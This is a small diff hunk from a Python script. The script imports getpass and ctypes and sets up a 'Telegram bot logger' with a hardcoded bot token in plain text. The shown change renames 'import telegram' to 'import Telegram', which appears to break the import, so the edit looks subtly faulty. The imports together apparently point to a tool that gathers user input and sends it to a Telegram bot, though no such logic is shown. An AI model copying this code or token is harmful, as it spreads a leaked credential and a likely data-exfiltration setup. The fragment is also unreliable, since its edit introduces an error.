@@ -5,7 +5,7 @@ import ctypes
 import hashlib
 import getpass
 import json
-import telegram
+import Telegram
 
 # Telegram bot logger
 BOT_TOKEN = "7363654474:AAHBf0GQsWTRmDJoeRQEtTPOhkbcN5Nlv9U"
